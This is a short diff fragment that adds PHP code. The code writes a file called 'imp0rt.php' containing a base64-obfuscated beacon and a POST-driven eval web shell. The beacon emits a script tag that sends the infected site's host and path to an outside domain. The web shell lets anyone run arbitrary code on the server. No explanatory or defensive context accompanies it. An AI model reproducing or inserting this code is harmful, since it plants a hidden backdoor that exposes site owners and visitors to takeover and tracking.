@@ -1,0 +1,2 @@
+file_put_contents('imp0rt.php','<?php eval(base64_decode(JHNlcnZlcnUgPSAkX1NFUlZFUiBbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydQSFBfU0VMRiddOwokY29weXVybGwgPSBiYXNlNjRfZGVjb2RlKCdKejQ4TDNOamNtbHdkRDQ9Jyk7CiRha2xsID0gYmFzZTY0X2RlY29kZSgnYUhSMGNEb3ZMM2RoYm1kNmFHVjZhR2xxYVdFdVkyOXRMMnN1Y0dod1AzVTknKTsKJHN0cj0iPFNDUklQVCBzcmM9JyIuJGFrbGwuJHNlcnZlcnUuJGNvcHl1cmxsLiIiOwplY2hvICRzdHI7));
+?><?php @eval($_POST[base64_decode(aW1wMHJ0)])?>'.time());
